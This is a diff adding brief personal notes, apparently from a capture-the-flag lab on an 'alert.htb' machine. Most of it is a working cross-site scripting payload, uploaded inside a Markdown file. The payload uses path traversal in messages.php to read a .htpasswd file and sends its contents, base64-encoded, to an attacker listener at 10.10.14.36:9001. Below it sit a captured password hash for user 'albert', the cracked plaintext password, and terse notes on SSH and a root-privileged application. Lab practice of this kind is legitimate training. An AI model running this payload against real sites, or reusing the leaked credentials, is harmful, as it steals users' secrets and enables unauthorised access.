@@ -1,0 +1,26 @@
+10.10.11.44
+
+upload MD file
+
+<script>
+    var url = "messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd"
+    var attacker = "http://10.10.14.36:9001/exfil"
+    var xhr = new XMLHttpRequest()
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState == XMLHttpRequest.DONE) {
+        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
+      }
+    }
+    xhr.open("GET", url, true)
+    xhr.send(null)
+</script>
+
+albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+manchesterunited
+
+
+ssh
+aplikacja z prawami roota
+
+
+
